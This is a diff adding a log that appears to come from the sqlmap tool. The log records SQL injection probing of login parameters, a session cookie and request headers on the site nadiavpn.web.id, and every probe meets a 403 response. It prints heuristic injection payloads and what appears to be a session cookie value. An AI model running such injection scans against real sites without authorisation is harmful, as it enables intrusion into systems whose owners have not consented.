@@ -1,0 +1,30 @@
+[08:17:35] [INFO] skipping POST parameter 'email'
+[08:17:35] [WARNING] POST parameter 'password' does not appear to be dynamic
+[08:17:35] [PAYLOAD] test123"'.,(,)(((
+[08:17:36] [DEBUG] got HTTP error code: 403 ('Forbidden')
+[08:17:36] [WARNING] heuristic (basic) test shows that POST parameter 'password' might not be SQL injectable
+[08:17:36] [PAYLOAD] test123'eUroIY<'">)ClOtLS
+[08:17:38] [DEBUG] got HTTP error code: 403 ('Forbidden')
+[08:17:38] [INFO] skipping POST parameter 'password'
+[08:17:38] [INFO] ignoring Cookie parameter 'XSRF-TOKEN'
+[08:17:38] [WARNING] Cookie parameter 'nadia-vpn-store-session' does not appear to be dynamic
+[08:17:38] [PAYLOAD] eyJpdiI6IjhUYTIrSG9wMyt6RFNvYVNHSTh3YlE9PSIsInZhbHVlIjoiTFN5RVNJcjUrM1paemZIM0ZmaTlrVU5kVklUcXpvbnlqcnY1dVVKZTRNZ2NXRVlvcUlsWmp2KzJ6c3djNk1RNjFrY0JpcVFBYTFUcWkxYXMwN2N4QUEvUXJLelQwYTlpMlRVV0xJRm5QR01hRlJRQjQvUGpkNjhxWHBRZXdRaXgiLCJtYWMiOiIzZTYyODc0ZjcyZjBlYjMxZTA1ZmJmM2JjNjRmYzEwMTdmZmRmZGU5MWFhYmZlNWZlZGEzODJiYmFjNTAwM2MyIiwidGFnIjoiIn0%3D',)".,,(.,
+do you want to URL encode cookie values (implementation specific)? [Y/n] Y
+[08:17:38] [DEBUG] used the default behavior, running in batch mode
+[08:17:39] [DEBUG] got HTTP error code: 403 ('Forbidden')
+[08:17:39] [WARNING] heuristic (basic) test shows that Cookie parameter 'nadia-vpn-store-session' might not be SQL injectable
+[08:17:39] [PAYLOAD] eyJpdiI6IjhUYTIrSG9wMyt6RFNvYVNHSTh3YlE9PSIsInZhbHVlIjoiTFN5RVNJcjUrM1paemZIM0ZmaTlrVU5kVklUcXpvbnlqcnY1dVVKZTRNZ2NXRVlvcUlsWmp2KzJ6c3djNk1RNjFrY0JpcVFBYTFUcWkxYXMwN2N4QUEvUXJLelQwYTlpMlRVV0xJRm5QR01hRlJRQjQvUGpkNjhxWHBRZXdRaXgiLCJtYWMiOiIzZTYyODc0ZjcyZjBlYjMxZTA1ZmJmM2JjNjRmYzEwMTdmZmRmZGU5MWFhYmZlNWZlZGEzODJiYmFjNTAwM2MyIiwidGFnIjoiIn0%3D'CEFoDJ<'">)LGxTNq
+[08:17:40] [DEBUG] got HTTP error code: 403 ('Forbidden')
+[08:17:40] [INFO] skipping Cookie parameter 'nadia-vpn-store-session'
+[08:17:40] [WARNING] parameter 'Referer' does not appear to be dynamic
+[08:17:40] [PAYLOAD] https://www.nadiavpn.web.id/login,('((.)",(
+[08:17:41] [DEBUG] got HTTP error code: 403 ('Forbidden')
+[08:17:41] [WARNING] heuristic (basic) test shows that parameter 'Referer' might not be SQL injectable
+[08:17:41] [PAYLOAD] https://www.nadiavpn.web.id/login'kTcvJd<'">)cZNBzf
+[08:17:42] [DEBUG] got HTTP error code: 403 ('Forbidden')
+[08:17:42] [INFO] skipping parameter 'Referer'
+[08:17:42] [WARNING] parameter 'User-Agent' does not appear to be dynamic
+[08:17:43] [DEBUG] got HTTP error code: 403 ('Forbidden')
+[08:17:43] [WARNING] heuristic (basic) test shows that parameter 'User-Agent' might not be SQL injectable
+[08:17:44] [DEBUG] got HTTP error code: 403 ('Forbidden')
+[08:17:44] [INFO] skipping parameter 'User-Agent'
